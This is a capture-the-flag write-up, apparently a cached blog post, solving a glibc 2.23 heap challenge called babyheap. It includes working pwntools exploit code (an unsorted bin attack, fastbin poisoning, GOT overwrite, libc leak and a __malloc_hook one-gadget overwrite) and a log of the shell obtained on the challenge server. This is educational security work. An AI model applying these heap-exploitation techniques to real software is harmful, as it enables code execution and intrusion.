@@ -1,0 +1,194 @@
+I"�J<p>I played this CTF with 0x1 and got 9th place.</p>
+
+<p>This was a Glibc 2.23 challenge with <code class="highlighter-rouge">global_max_fast</code> set to 0x10, meaning we have no access to the fastbin.</p>
+
+<p>TL;DR:</p>
+
+<ol>
+  <li>Free a chunk into the unsorted bin</li>
+  <li>One byte brute force to overwrite the <code class="highlighter-rouge">bk</code> pointer of the free unsorted bin chunk to <code class="highlighter-rouge">&amp;global_max_fast - 0x10</code></li>
+  <li>Launch an unsorted bin attack to overwrite <code class="highlighter-rouge">global_max_fast</code> with the unsorted bin’s address, giving us access to the fastbin.</li>
+  <li>Fastbin dup to get a chunk above the global array of chunks.</li>
+  <li>Overwrite index 0 of the global array of chunks to point to <code class="highlighter-rouge">free@got</code>.</li>
+  <li>Overwrite <code class="highlighter-rouge">free@got</code> with <code class="highlighter-rouge">printf@plt</code>.</li>
+  <li>Edit the chunk above the global array of chunks and set index 0 to point to <code class="highlighter-rouge">puts@got</code>.</li>
+  <li>Call <code class="highlighter-rouge">free</code> on index 0 to get <code class="highlighter-rouge">puts</code> libc leak.</li>
+  <li>Fastbin dup attack to overwrite <code class="highlighter-rouge">__malloc_hook</code> to one gadget and get shell.</li>
+</ol>
+
+<h3 id="challenge">Challenge</h3>
+
+<p><strong>Points</strong>: 286</p>
+
+<blockquote>
+  <p>Just another babyheap challenge.</p>
+
+  <p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap">http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap</a></p>
+
+  <p><a href="http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6">http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6</a></p>
+
+  <p><code class="highlighter-rouge">nc 51.158.118.84 17001</code></p>
+
+  <p>Flag format: CTF{…}</p>
+
+  <p>Created by: <a href="https://backdoor.sdslabs.co/users/fs0ciety">Nipun Gupta</a></p>
+
+  <p>No. of Correct Submissions: 12</p>
+</blockquote>
+
+<h3 id="solution">Solution</h3>
+
+<p>This challenge was very interesting. I’ve read writeups of similar challenges before but never done a challenge of this type, so this was a good learning experience for me.</p>
+
+<h4 id="reverse-engineering">Reverse Engineering</h4>
+
+<p>Running the binary shows us this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------DATA BANK----------
+1) Add data
+2) Edit data
+3) Remove data
+4) Exit
+&gt;&gt; 
+</code></pre></div></div>
+
+<p>It looks very similar to babytcache, but without the ability to view data. It is also GLIBC 2.23. It also does not have PIE or Full RELRO enabled:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu1604:/ctf/practice/backdoorctf/babyheap<span class="nv">$ </span>checksec babyheap
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/babyheap/babyheap'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Looking at the binary now, the main function right at the beginning does the following:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mallopt</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>If you look at the manpage of <code class="highlighter-rouge">mallopt</code>, you will see that this means that the binary is disabling the fastbin by setting <code class="highlighter-rouge">global_max_fast</code> to a value of 0x10. Since chunks must have a minimum size of 0x20 (with the metadata), the fastbin is impossible to use like this.</p>
+
+<p>As for vulnerabilities, it is the exact same as babytcache except some constraints, so I will skip showing my interpretation of the pseudocode for each function.</p>
+
+<ol>
+  <li>The add function lets you add up to 12 chunks max throughout the process’s lifetime.</li>
+  <li>The free function has a UAF. It also has a free limit of 8 frees.</li>
+</ol>
+
+<h4 id="steps-to-solve">Steps to solve</h4>
+
+<p>First, we must overwrite <code class="highlighter-rouge">global_max_fast</code> with some value that is not 0x10, so we can use the fastbins again. Since there is no easy way to get a leak, it will be almost impossible to launch a small bin unsafe unlink attack to overwrite anything useful.</p>
+
+<p>Since we don’t have a leak, the overwriting of <code class="highlighter-rouge">global_max_fast</code> required bruteforcing a single byte. If you add two chunks of size 0x30 and free the first one, you can compare the address of <code class="highlighter-rouge">global_max_fast</code> vs the address of the unsorted bin and see the following:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">unsortedbin</span>
+<span class="n">unsortedbin</span>
+<span class="n">all</span><span class="o">:</span> <span class="mh">0x1c25000</span> <span class="err">—▸</span> <span class="mh">0x7f2e38f3bb78</span> <span class="p">(</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">88</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1c25000</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">&amp;</span><span class="n">global_max_fast</span> 
+<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span> <span class="mh">0x7f2e38f3d7f8</span> <span class="o">&lt;</span><span class="n">global_max_fast</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>You will notice that the least significant byte of <code class="highlighter-rouge">global_max_fast</code> is always <code class="highlighter-rouge">0xf8</code>, and the second least significant byte will constantly change. Everything else will be the same.</p>
+
+<p>We can brute force the second byte and have a 1/8 chance of getting the address of <code class="highlighter-rouge">global_max_fast</code>.</p>
+
+<p>I decided to launch an unsorted bin attack to overwrite <code class="highlighter-rouge">global_max_fast</code> with the address of the unsorted bin. If you are unfamiliar with the unsorted bin attack, you may refer to <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c">this</a>.</p>
+
+<p>Essentially, I chose a chunk of size 0x30 to perform the unsorted bin attack on. Since it will corrupt the unsorted bin, it will mean we can’t malloc any chunks &lt;= 0x30 in size anymore, which is fine for us.</p>
+
+<p>Here is how the 1 byte bruteforce works:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+	<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># Used for unsorted bin attack
+</span>	<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span> <span class="c1"># Used for fastbin dup
+</span>
+	<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Send chunk A to the unsorted bin
+</span>
+	<span class="c1"># Overwrite A's bk with bruteforced &amp;global_max_fast - 0x10
+</span>	<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x27e8</span><span class="p">))</span>
+
+	<span class="k">try</span><span class="p">:</span>
+		<span class="c1"># Launch the unsorted bin attack
+</span>		<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+
+		<span class="c1"># If the unsorted bin attack successfully overwrote global_max_fast,
+</span>		<span class="c1"># Then we can do a fastbin poisoning attack to get a chunk right above the
+</span>		<span class="c1"># global data array
+</span>		<span class="c1">#
+</span>		<span class="c1"># If we successfully get the chunk there, overwrite idx 0 with free@got
+</span>		<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020cd</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>
+		<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s">'Z'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+		<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s">'Z'</span><span class="o">*</span><span class="mh">0x53</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
+		<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+			<span class="n">debug</span><span class="p">([])</span>
+		<span class="k">break</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="c1"># If it didn't work, close the process and try again
+</span>		<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+		<span class="k">continue</span>
+</code></pre></div></div>
+
+<p>Initially we free the 0x30 chunk into the unsorted bin and overwrite the last byte with 0xe8, and the second last byte with one of the many valid bytes I found <code class="highlighter-rouge">&amp;global_max_fast</code> had with gdb. Then, within a <strong>try-except</strong> block, we launch the unsorted bin attack and then immediately try to do the fastbin poisoning attack. If the unsorted bin attack succeeded, then the fastbin attack will work, otherwise it will go to the <strong>except</strong> block and restart.</p>
+
+<p>Should the fastbin attack succeed, we pick this memory address because it looks like a valid chunk header for a 0x68 sized chunk:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="mh">0x6020cd</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="mh">0x6020bd</span><span class="o">:</span>       <span class="mh">0xfff7dd2540000000</span>      <span class="mh">0x000000000000007f</span>
+<span class="mh">0x6020cd</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+</code></pre></div></div>
+
+<p>We then simply write enough bytes until we reach the global data array and overwrite index 0 to the address of <code class="highlighter-rouge">free@got</code>.</p>
+
+<p>If all of this succeeds, we will be out of the while loop now. My plan was to overwrite <code class="highlighter-rouge">free</code> with <code class="highlighter-rouge">printf</code> and use that to leak a libc address. Before I do that though, I free another 0x68 sized chunk into the fastbin to prepare for the second fastbin poisoning attack. I then overwrite <code class="highlighter-rouge">free@got</code> with the address of <code class="highlighter-rouge">printf@plt</code>, and change index 0 to point to <code class="highlighter-rouge">puts@got</code> and attempt to free index 0. This will cause printf to be called with the address stored in index 0, which is actually <code class="highlighter-rouge">puts@got</code>, giving us a leak:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># Prep for next fastbin poisoning attack
+</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span> <span class="c1"># Overwrite free with printf
+</span><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'Z'</span><span class="o">*</span><span class="mh">0x53</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602020</span><span class="p">))</span> <span class="c1"># Change idx 0 to puts@got
+</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># printf(puts@got)
+</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Finally, we do the classic fastbin poisoning attack to get a chunk at <code class="highlighter-rouge">__malloc_hook-0x30+0xd</code> and overwrite <code class="highlighter-rouge">__malloc_hook</code> with a working one gadget and get a shell:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x30</span><span class="o">+</span><span class="mh">0xd</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s">'Z'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0xf1147</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'8'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'104'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>It took quite a bit of time to work remotely due to the brute force, so I just cut out the brute force bit.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu1604:/ctf/practice/backdoorctf/babyheap<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/babyheap/babyheap'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/babyheap/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+REMOTE PROCESS
+<span class="o">[</span>+] Opening connection to 51.158.118.84 on port 17001: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f9e95bcc000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>Dockerfile
+babyheap
+babyheap.c
+beast.toml
+flag.txt
+post-build.sh
+public
+setup.sh
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+CTF<span class="o">{</span>REDACTEDREDACTEDREDACTED<span class="o">}</span>
+<span class="nv">$ </span>
+</code></pre></div></div>
+:ET
